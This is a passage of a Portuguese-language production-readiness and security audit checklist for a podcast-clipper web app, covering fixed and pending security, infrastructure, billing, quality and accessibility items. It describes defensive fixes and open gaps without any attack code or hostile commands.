  - **Correção:** `INNGEST_SIGNING_KEY`, `INNGEST_EVENT_KEY` e `INNGEST_DEV` declaradas no schema `server` de `src/env.js` (`.optional()` — dev local roda sem Inngest Cloud) + `src/inngest-env-guard.js::assertInngestProductionEnv`, chamada por `src/env.js` logo após o `createEnv` (só no servidor, respeitando `SKIP_ENV_VALIDATION`). Com `NODE_ENV=production`: key ausente/vazia → erro; `INNGEST_DEV` com valor "verdadeiro" (`1`, `true`, URL) → erro, porque coloca o SDK em dev mode, que **desliga** a verificação de assinatura em `/api/inngest`. Como `next.config.js` importa `src/env.js`, a falha acontece no `next build` e no boot.
  - **Comportamento do SDK (`inngest` 4.20, lido em `InngestCommHandler.js`):** em cloud mode (default sem `INNGEST_DEV`), POST sem `X-Inngest-Signature` válida → 401; sem signing key → 500 antes de executar qualquer função. O teste de integração é regression guard desse comportamento.
  - **Achado durante a investigação:** o `.env` local de dev contém `INNGEST_DEV=1`, e o `@prisma/client` carrega o `.env` em `process.env` ao ser importado (só preenche variáveis ausentes). Ou seja: qualquer runtime de produção que tivesse um `.env` de dev junto e não definisse `INNGEST_DEV` explicitamente rodaria o Inngest em dev mode sem verificação de assinatura. Hoje os `.env*` não são versionados (confirmado com `git ls-files`/`git check-ignore`), e a validação central agora barra esse cenário no boot.
  - TDD (RED confirmado antes). Testes: `tests/unit/config/inngest-env-validation.test.ts` (20 casos, incluindo import real de `~/env`), `tests/integration/inngest-serve-signature.integration.test.ts` (4 casos sobre o route handler real de `/api/inngest`).
  - **Operação:** configurar `INNGEST_SIGNING_KEY` e `INNGEST_EVENT_KEY` (Inngest Cloud) em todo ambiente com `NODE_ENV=production`, **inclusive previews da Vercel**, e nunca definir `INNGEST_DEV` nesses ambientes. Um `npm run build`/`npm run preview` local sem essas keys agora falha. Para contornar só localmente, use `SKIP_ENV_VALIDATION=1` (mesmo mecanismo do CI).

- [x] **Endpoint de debug Stripe ainda em produção — RESOLVIDO (2026-10-11, RNF-SEC-10)** — `/api/dev-sign-stripe-payload` (`src/app/api/dev-sign-stripe-payload/route.ts:22-40`) protegido só por `NODE_ENV === "production"` — insuficiente. Endpoint **removido** (mesmo item de "Riscos de Segurança por Design", fechado junto; detalhes e testes lá). Substituto local/offline para o experimento de observabilidade: `ai-podcast-clipper-frontend/scripts/sign-stripe-test-payload.js`.

### Infraestrutura

- [ ] **Chave Clerk de produção não configurada** — `NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY` local é placeholder inválido (`.env.production`), o que faz falhar `test:integration` (`health-check.test.ts`, `legal-pages.test.ts`: 12 falhas, problema de ambiente local pré-existente). Configurar `pk_live_...` (e a chave secreta correspondente) no ambiente de deploy antes do go-live.

- [ ] **Sem `vercel.json` — configuração de deploy não versionada** — Domínio, redirects, headers, regions não documentados/reproduzíveis.

- [x] **Secret do Modal sem checklist documentado — RESOLVIDO (2026-10-11)** — Documentação sobre quais variáveis `modal.Secret.from_name("ai-podcast-clipper-secret")` precisa conter não existia. Criado `./modal-secret-checklist.md`, levantado por leitura de `main.py`/`local_server.py`/`core/storage/factory.py`/`core/moments_factory.py`/`core/claude_moments.py`: lista cada variável, se é obrigatória, e o que acontece se faltar (processo não sobe vs. cai num fallback silencioso, ex. `GEMINI_API_KEY` ausente só falha na primeira chamada ao Gemini — gap já conhecido, ver item MEDIUM acima). Inclui a nova `APP_ENV=production`, exigida pelo guard de `S3_ENDPOINT_URL` resolvido no item HIGH acima.

- [ ] **Bucket S3 hardcoded divergente entre front e backend** — Backend: `"ai-podcast-clipper"` (`ai-podcast-clipper-backend/main.py:314,468`); Frontend: `S3_BUCKET_NAME` — inconsistência.

- [x] **Auth do endpoint Modal com comparação não constant-time — RESOLVIDO (2026-10-09)** — RNF-SEC-07. `main.py::process_video` e `main.py::download_youtube` (e `local_server.py::verify_auth_token`) comparavam o bearer com `!=` (timing side-channel). Agora usam `hmac.compare_digest` sobre bytes (`.encode("utf-8")`); `AUTH_TOKEN` ausente/vazio ou bearer vazio → 401 explícito. Bearer não-ASCII → 401 (guarda contra regressão: `compare_digest` com `str` não-ASCII lança `TypeError`).  
  **Nota sobre o impacto:** `!=` em strings não é constant-time (o vazamento por tempo é a razão da correção; não foi medido um ataque real). O caso de `AUTH_TOKEN` vazio não era alcançável pela rede, porque o `HTTPBearer` do FastAPI já rejeita bearer vazio com 401.  
  **Evidência:** 15 cenários × ponto de entrada, com espião em `hmac.compare_digest`, hoje divididos em 2 arquivos por exigência do job leve de CI (ver item "CI do backend vermelho" abaixo): `ai-podcast-clipper-backend/tests/test_auth_token_constant_time.py` (10 passed: 5 cenários × `main.process_video`/`main.download_youtube`) e `tests/test_local_server.py::TestVerifyAuthTokenConstantTime` (5 passed: `local_server.verify_auth_token`). Suíte backend completa `.venv/bin/python -m pytest`: 192 passed.

- [x] **CI do backend vermelho na `main` — 3 bugs corrigidos (2026-10-09)** — Introduzidos pelo próprio commit do RNF-SEC-07/cortes manuais (`9116f7c`) mais um bug pré-existente do job `backend-local-server` desde sua criação (`c1b9bfe`, 02/10): (1) `tests/test_auth_token_constant_time.py` importava `local_server` no topo do módulo, o que quebra a *coleta* (não só a execução) do job leve `backend` inteiro com `ModuleNotFoundError: No module named 'uvicorn'`, porque `local_server.py` só importa com torch/torchaudio instalados; (2) o mesmo padrão, de forma lazy (dentro de uma fixture, não detectável até a causa 1 ser corrigida), em `tests/test_manual_cut_input_hardening.py::TestProcessVideoEndpointRejectsHostileCutsWith422`; (3) o job `backend-local-server` nunca instalou `pytest`/`pytest-mock` (só `requirements.txt`, nunca `requirements-test.txt`), então `pytest tests/test_local_server.py` sempre falhava com "command not found" — sem evidência no histórico do git de que esse job já tenha passado alguma vez.
  **Evidência:** verificado em venvs temporários reproduzindo cada job exatamente (não no `.venv` do repo, que mascara o problema por já ter todas as deps). Venv leve (só `requirements-test.txt`): antes, `pytest -v --ignore=tests/test_local_server.py` → `collected 159 items / 1 error` + `Interrupted: 1 error during collection` (nenhum teste roda); depois, **164 passed, 0 errors**. Venv completo (`requirements.txt`): antes, `pytest tests/test_local_server.py` → `No module named pytest`; depois de `pip install pytest pytest-mock`, **28 passed**.
  **Resolvido:** classes que importam `local_server` movidas para `tests/test_local_server.py` (job `backend-local-server`, deps completas); `.github/workflows/ci.yml` job `backend-local-server` ganhou `pip install pytest pytest-mock` no step "Install full dependencies". Detalhes completos em `progress.md`, entrada "2026-10-09: CI do backend vermelho na `main`".

- [ ] **Observabilidade sem exportação externa** — Stack OpenTelemetry só local; sem alertas reais (Slack, email, PagerDuty).

- [ ] **Healthcheck `/api/health` não valida dependências** — `route.ts:1-5` sempre retorna 200 sem checar Postgres, Redis, Stripe, S3.

- [ ] **Sem estratégia de rollback documentada** — Procedimento não escrito.

- [ ] **Backup/restore do Postgres não documentado** — Sem plano de DR.

### Billing e Dados

- [ ] **Fallback silencioso de customer Stripe** — `sync-user.use-case.ts:34-38` gera `cus_fallback_*` se busca falhar; sem alertar ou falhar explícito.

- [ ] **Sem idempotência contra retries Inngest** — Operações de crédito de assinatura podem ser aplicadas 2x se job retratar.

- [ ] **Webhook Clerk sem idempotência deliberada** — Apenas acidental.

- [ ] **Índices ausentes em FKs de alto volume** — `UploadedFile.userId`, `Clip.userId`/`uploadedFileId`, `CreditTransaction.type`, `Subscription.status` — `prisma/schema.prisma` sem `@@index` ou `@@unique`.

- [ ] **Breakdown sub/avulso frágil** — `src/infrastructure/queue/stripe-queue.ts` usa regex em descrição para distinguir tipos.

### Qualidade

- [ ] **Webhook Stripe sem teste de integração real** — `src/app/api/webhooks/stripe/route.ts` testado só com mocks (fake Stripe responses).

- [ ] **Testes de carga com k6 nunca executados** — Sem baseline de performance; script existe mas não roda em CI.

- [ ] **7 warnings ESLint não resolvidos** — 6 `@typescript-eslint/no-unused-vars` (variáveis/imports não usados em `src/`) e 1 `react-hooks/exhaustive-deps`. Verificado em 2026-10-08: `npm run check` exit 0 (0 erros, 7 warnings). Não bloqueiam o CI.

### Acessibilidade (WCAG 2.1 AA) — 16 Violações HIGH Adicionais

- [ ] Video player sem role ARIA adequado
- [ ] Modais sem focus trap
- [ ] FAQ accordion sem aria-controls
- [ ] Carousel automático sem pausa
- [ ] Tabela de preços sem acessibilidade
- [ ] `window.confirm()` pra exclusão (sem alternativa acessível)
- [ ] Navegação sem aria-current
- [ ] Mais 9 itens (detalhe completo sob demanda via `accessibility-tester` — resumido aqui por brevidade)

---

## NICE — Melhorias Recomendadas

Estes itens melhoram confiabilidade, manutenibilidade e experiência, mas não bloqueiam lançamento.

### Segurança

- Logging estruturado de eventos de autorização negada — Não há logger estruturado (`pino`/`winston`/etc.) para rastrear tentativas de acesso negado (IDOR bloqueado, sessão inválida). Importante para detectar exploração de vulnerabilidades corrigidas. *(Incorporado de OWASP ASVS V7 — P2)*
- Rate limiter é por instância/processo, não é garantia global em multi-instância — `InMemorySlidingWindowRateLimiter` não é duro em ambiente serverless/multi-instância; considerar Redis/Memcached para distribuído. *(Incorporado de OWASP ASVS V11 — P2)*
- `.gitignore` não cobre `.env*` globalmente (nenhum exposto hoje, proteger contra futuros).
- PII em logs (Gemini responses, títulos de clip) — remover ou sanitizar.
- Mensagens de erro do backend vazam detalhes internos (`str(e)` no detail) — genéricos pra cliente.
- Token de teste fixo "Bearer 123123" em `ai-podcast-clipper-backend/main.py:575` — remover.

### Infraestrutura

- CORS explícito no backend FastAPI — `main.py` e `local_server.py` não configuram `CORSMiddleware` — comportamento padrão do FastAPI (sem CORS habilitado) bloqueia browsers cross-origin, mas política não está documentada/testada. *(Incorporado de OWASP ASVS V9 — P2)*
- Inngest sem validação central de env vars — centralizar.
- `ai-podcast-clipper-backend/asd/` deveria ser submódulo git real (`.gitmodules`).
- Renomear `ai-podcast-clipper-frontend/src/middleware.ts` para `proxy.ts` (mesma pasta) — no Next 16 a convenção é `proxy.ts`; `middleware.ts` gera apenas warning de deprecação no `next build`, não é removido nem obrigatório hoje. Mantido sem alteração no upgrade para 16.4.0 (decisão deliberada, 2026-10-08).
- Definir `turbopack.root` / `outputFileTracingRoot` em `ai-podcast-clipper-frontend/next.config.js` — o build reporta warning de múltiplos lockfiles (monorepo, `package-lock.json` na raiz e no frontend). Só cosmético, baixa prioridade.

### Qualidade

- Testes e2e não existem (mas terreno já preparado via testes de integração estruturados).
- Backend Python não testado nesta auditoria (ambiente sem Python 3.12).
- **Lint de `tests/`, `load-tests/` e configs de raiz do frontend fora de escopo (decisão deliberada, 2026-10-08)** — Após a migração de `next lint` para `eslint .` direto (Next 16.4.0 removeu `next lint`), o novo comando varre o repositório inteiro, enquanto o antigo só cobria por padrão `app/`, `pages/`, `components/`, `lib/`, `src/` (neste projeto, na prática, só `src/`). Isso expôs ~366 erros de dívida técnica pré-existente nunca lintada antes, majoritariamente `@typescript-eslint/no-explicit-any` e `@typescript-eslint/unbound-method` em mocks de `tests/unit/**`, além de warnings em `load-tests/*.js`, `postcss.config.js` e `prettier.config.js`. Pra não travar o CI com essa dívida agora, `ai-podcast-clipper-frontend/eslint.config.js` ganhou um bloco `ignores` restaurando o escopo pra `src/` (excluindo `tests/**`, `load-tests/**`, `next.config.js`, `postcss.config.js`, `prettier.config.js`) — nenhum arquivo dentro de `src/` foi excluído, a cobertura de lint que já existia lá foi 100% preservada. Pendência: limpar os ~366 problemas de `tests/`/`load-tests/` e reincluir esses caminhos no escopo do lint numa tarefa futura dedicada.

### Produto

- Imports não usados em vários arquivos — cleanup.
- `<img>` cru em vez de `next/image` (`src/components/...`).
- Polling agressivo a cada 4s — considerar WebSocket ou SSE.

### Acessibilidade (WCAG 2.1 AA) — 8 Melhorias

- Skip links ausentes.
- `aria-busy` não usado em estados de loading.
- Contraste em light mode abaixo de 4.5:1 em alguns textos.
- Mais 5 itens (detalhe sob demanda).

---

## Resumo Executivo

**Status:** PRONTO PARA FASE 5 — PORTÃO DE QUALIDADE FINAL (Fases 1-4 de 5 concluídas)

- **Bloqueadores:** **21 itens críticos, TODOS RESOLVIDOS** (Fases 1-4)
  - **Fases 1-3 (código e infra — 12 itens):**
    - Billing: taxonomia de planos corrigida (PlanCatalogService, env vars obrigatórias, migration com CHECK constraint), pacotes avulsos removidos, deduplicação de webhook Stripe com race condition corrigida (dispatch agora awaited, resposta 503 se falhar), bug crítico de checkout corrigido (redirecionamento ao Stripe desbloqueado via `unstable_rethrow`), webhooks de pagamento falhado/reembolso/chargeback implementados (`invoice.payment_failed` marca `past_due`, carência de 3 dias, `charge.refunded` e `charge.dispute.created` revogam créditos, TDD com 6 testes de integração, 649 testes passando)
    - Segurança: CVEs críticas do Next.js patcheadas (15.5.27), S3 lifecycle agora grava clipes em `clips/` via `s3_paths.py`, env vars validadas com Zod
    - Infra: submódulo Git `asd/` criado via `.gitmodules`, migrações Prisma baseline criada (baseline cobrindo 6 tabelas), testes do backend versionados (saíram de `.gitignore`)
    - Qualidade: erros de TypeScript corrigidos (`npm run check` 100% verde), 2 use cases ganharam 26 testes (15 unitários + 11 integração)
  
  - **Fase 4 (produto e acessibilidade — 9 itens):**
    - Produto: upload direto escondido (decisão de produto), branding corrigido ("Podcast Clipper", links de suporte atualizados com placeholder TODO), páginas legais implementadas com placeholders `[A PREENCHER]` para dados da empresa
    - Acessibilidade: todas as 6 violações WCAG 2.1 AA blocker resolvidas (aria-label em botões, controles de teclado no player, role="alert" e aria-live em forms, focus indicators visíveis); 16 testes novos de acessibilidade

- **Próximos passos (Fase 5 — portão de qualidade final):**
  1. Rodar CI do zero (GitHub Actions backend + frontend)
  2. Simular clone novo do repositório (validar `.gitmodules`, migrations, dependencies)
  3. Revisão de segurança do diff completo acumulado desde baseline
  4. Confirmar suíte de testes 100% verde em ambientes isolados
  
- **Pendências do usuário (não de código — fora do escopo de Fase 5):**
  1. Criar 4 price IDs reais no Stripe (Starter mensal/anual, Pro mensal/anual)
  2. Preencher dados jurídicos reais em páginas legais (razão social, CNPJ, endereço, e-mail, foro)
  3. Decidir e-mail de suporte real (atualmente `suporte@PREENCHER.com.br`)

- **Atualização (2026-10-08):** upgrade Next.js 15.5.27 → 16.4.0, migração de `next lint` para `eslint .` direto e correção de 13 erros de lint pré-existentes. Verificado: `npm run check` exit 0 (7 warnings pré-existentes), `npm run build` exit 0, `npm run test` 605 passed | 8 skipped, `npm audit --audit-level=high --omit=dev` 0 vulnerabilidades. `test:integration` com servidor rodando: 75/87 (12 falhas de ambiente, ver item Chave Clerk em HIGH → Infraestrutura). Detalhes nos itens BLOCKER "REGRESSÃO" (Qualidade e CI) e HIGH de dependências npm.
- **Atualização (2026-10-11):** plano de correção dos itens HIGH restantes (criado pelo `cto`, executado por 7 agentes especializados em paralelo — grupos B1/B2/F1-F5). **9 itens HIGH resolvidos nesta rodada:** rate limiting em actions de projeto/billing (P1) e em `/api/youtube/info`; SSRF no `local_server.py` (passou a usar `download_youtube_to_s3` + storage plugável, igual produção); `s3_key` arbitrário no download do YouTube (allowlist de formato + `extra="forbid"`); guard de produção para `S3_ENDPOINT_URL` no backend (nova env `APP_ENV`); endpoint de debug `/api/dev-sign-stripe-payload` removido; validação central das env vars do Inngest + guard da fila de fallback do Stripe; checklist do secret do Modal documentado (`./modal-secret-checklist.md`). **+1 na sequência (mesmo dia):** leitura de arquivo local via `s3_key` no `/process_video` (fallback de `resolve_input_video_path` removido + formato de `ProcessVideoRequest.s3_key` validado, RNF-SEC-19; backend `pytest` 359 passed). **1 item parcial:** CSP ativada em modo `Report-Only` (não enforce — falta validação ao vivo em staging, decisão do usuário para promover). Verificado após consolidação: backend `pytest` 320 passed; frontend `npm run check` limpo (7 warnings pré-existentes), `npm run test` 741 passed/8 skipped, `npm run test:integration` 134 passed. Nenhuma regressão. Detalhes de cada item nas seções correspondentes acima e em `progress.md` (entradas de 2026-10-11).
- **High:** **43 itens originais, 10 resolvidos em 2026-10-11 (ver atualização acima) → 33 restantes**, mais 1 parcial (CSP, Report-Only)
- **Nice:** **23 melhorias** que podem ser planejadas pós-lançamento (incorporados 3 itens do OWASP ASVS: logging estruturado [P2], CORS FastAPI [P2], rate limiter global [P2])

---

## Nota sobre Fusão com OWASP ASVS

Este checklist incorpora todos os gaps de segurança do [**OWASP ASVS Nível 2**](https://owasp.org/www-project-application-security-verification-standard/) relevantes a este projeto.

**Referências cruzadas:**
- Detalhes de implementação por feature: `../requisitos/casos-de-uso-e-regras-de-negocio.md`
- Histórico de decisões de design e specs: `../historico/superpowers/specs/` e `../historico/superpowers/plans/`
